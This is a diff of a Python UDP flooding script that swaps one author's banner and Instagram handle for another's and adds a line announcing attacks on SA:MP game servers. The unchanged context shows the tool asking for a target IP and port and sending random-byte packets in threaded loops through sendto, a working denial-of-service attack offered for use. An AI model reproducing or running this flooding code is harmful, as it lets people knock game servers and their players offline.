@@ -33,15 +33,11 @@ print(" <XXXXXXXXXXXXXXX>")
 time.sleep(2)
 print(" <SUCCESSFUL!!!> ")
 time.sleep(5)
-print("------------------------------------------------------------")
-print("░█████╗░██╗░░░██╗░██████╗████████╗██╗███╗░░██╗")
-print("██╔══██╗██║░░░██║██╔════╝╚══██╔══╝██║████╗░██║")
-print("███████║██║░░░██║╚█████╗░░░░██║░░░██║██╔██╗██║")
-print("██╔══██║██║░░░██║░╚═══██╗░░░██║░░░██║██║╚████║")
-print("██║░░██║╚██████╔╝██████╔╝░░░██║░░░██║██║░╚███║")
-print("╚═╝░░╚═╝░╚═════╝░╚═════╝░░░░╚═╝░░░╚═╝╚═╝░░╚══╝")
-print("<TOOLS BY AUSTIN>")
-print("<FOLLOW MY IG : @TDYFNNX_ >")
+print("<TOOLS BY TdyNoCounter!!!!! >")
+print("<FOLLOW MY IG : @TdyBoyy_ >")
+print(" LETS FUCKING SA:MP SERVERS")                             
+print(" ▀█▀ █▀▀ █▀▄ █▀▄ █▄█ █▀▄ █▀█ █▀ ")
+print(" ░█░ ██▄ █▄▀ █▄▀ ░█░ █▄▀ █▄█ ▄█ ")
 print("------------------------------------------------------------")
 ip = str(input(" Austin | Ip:"))
 port = int(input(" Austin | Port:"))
@@ -59,7 +55,7 @@ def run():
 				s.sendto(data,addr)
 			print(i +" Austin is Here ")
 		except:
-			print("[!] Puts Your Hands UP! ")
+			print("[!] Tdyy no counter! ")
 
 def run2():
 	data = random._urandom(16)
@@ -74,7 +70,7 @@ def run2():
 			print(i +" Austin is Here ")
 		except:
 			s.close()
-			print("[*] Puts Yout Hands UP! ")
+			print("[*] Tdyy no counter! ")
 
 for y in range(threads):
 	if choice == 'y':
